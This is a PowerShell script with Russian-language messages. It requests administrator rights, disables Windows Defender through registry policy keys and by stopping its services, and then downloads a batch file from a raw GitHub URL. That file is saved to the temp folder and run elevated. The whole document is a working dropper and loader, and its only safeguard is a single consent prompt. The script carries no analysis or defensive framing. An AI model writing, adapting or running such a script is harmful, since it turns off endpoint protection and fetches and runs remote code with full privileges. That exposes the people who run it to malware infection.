param(
    [Parameter(Mandatory=$true)]
    [string]$Url = "https://raw.githubusercontent.com/DeathCheat1/dgfhffd/refs/heads/main/test.bat",
    [Parameter(Mandatory=$false)]
    [string]$DestinationPath,
    [Parameter(Mandatory=$false)]
    [string]$Arguments
)

function Ensure-AdminRights {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Host "Запрашиваю повышение прав..." -ForegroundColor Yellow
        $scriptPath = $MyInvocation.MyCommand.Path
        $scriptArgs = "-Url `"$Url`""
        if ($DestinationPath) { $scriptArgs += " -DestinationPath `"$DestinationPath`"" }
        if ($Arguments) { $scriptArgs += " -Arguments `"$Arguments`"" }
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $scriptArgs"
        $psi.Verb = "runas"
        try {
            [System.Diagnostics.Process]::Start($psi)
            exit
        }
        catch {
            Write-Host "Ошибка запроса прав: $_" -ForegroundColor Red
            exit 1
        }
    }
    else {
        Write-Host "Уже с правами администратора." -ForegroundColor Green
    }
}

function Disable-Defender {
    Write-Host "Пытаюсь отключить Windows Defender (службы и реестр)..." -ForegroundColor Cyan
    try {
        # Отключаем через групповую политику (если доступно)
        if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender") {
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
        } else {
            New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
        }
        # Отключаем реальную защиту через реестр
        $defenderKey = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
        if (Test-Path $defenderKey) {
            Set-ItemProperty -Path $defenderKey -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
            Set-ItemProperty -Path $defenderKey -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
            Set-ItemProperty -Path $defenderKey -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force
            Set-ItemProperty -Path $defenderKey -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force
        }
        # Останавливаем службу WinDefend
        Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
        # Останавливаем связанные службы
        Stop-Service -Name "WdNisSvc" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "WdNisSvc" -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service -Name "WdBoot" -Force -ErrorAction SilentlyContinue
        Stop-Service -Name "WdFilter" -Force -ErrorAction SilentlyContinue
        
        Write-Host "Defender отключён (требуется перезагрузка для полного применения)." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Не удалось отключить Defender: $_" -ForegroundColor Red
        Write-Host "Возможно, включена Tamper Protection. Отключите её вручную в Безопасность Windows -> Защита от вирусов -> Управление настройками -> Защита от несанкционированного доступа" -ForegroundColor Yellow
        return $false
    }
}

function Download-File {
    param([string]$url, [string]$destPath)
    Write-Host "Скачиваю из $url ..." -ForegroundColor Cyan
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $destPath)
        Write-Host "Сохранено: $destPath" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка скачивания: $_" -ForegroundColor Red
        return $false
    }
}

function Run-AsAdmin {
    param([string]$filePath, [string]$arguments)
    if (-not (Test-Path $filePath)) {
        Write-Host "Файл не найден: $filePath" -ForegroundColor Red
        return $false
    }
    Write-Host "Запускаю от имени администратора: $filePath" -ForegroundColor Cyan
    try {
        $processArgs = @{
            FilePath = $filePath
            Verb = "runas"
            Wait = $false
        }
        if ($arguments) {
            $processArgs.ArgumentList = $arguments
        }
        Start-Process @processArgs
        Write-Host "Запущено." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка запуска: $_" -ForegroundColor Red
        return $false
    }
}

try {
    Ensure-AdminRights

    Write-Host "`nДля скачивания и запуска файла требуется отключить Windows Defender." -ForegroundColor Yellow
    $userChoice = Read-Host "Вы согласны отключить антивирус? (y/n)"
    if ($userChoice -ne 'y') {
        Write-Host "Отказ пользователя. Выход." -ForegroundColor Red
        exit 1
    }
    $defenderDisabled = Disable-Defender
    if (-not $defenderDisabled) {
        Write-Host "Не удалось отключить антивирус. Дальнейшая работа невозможна." -ForegroundColor Red
        exit 1
    }

    if (-not $DestinationPath) {
        $fileName = [System.IO.Path]::GetFileName($Url)
        if (-not $fileName) { $fileName = "downloaded_file" }
        $DestinationPath = Join-Path $env:TEMP $fileName
    }
   
    $downloadSuccess = Download-File -url $Url -destPath $DestinationPath
    if (-not $downloadSuccess) {
        throw "Не удалось скачать файл."
    }
   
    $runSuccess = Run-AsAdmin -filePath $DestinationPath -arguments $Arguments
    if (-not $runSuccess) {
        throw "Не удалось запустить файл."
    }
   
    Write-Host "Готово." -ForegroundColor Green
}
catch {
    Write-Host "Ошибка: $_" -ForegroundColor Red
    exit 1
}
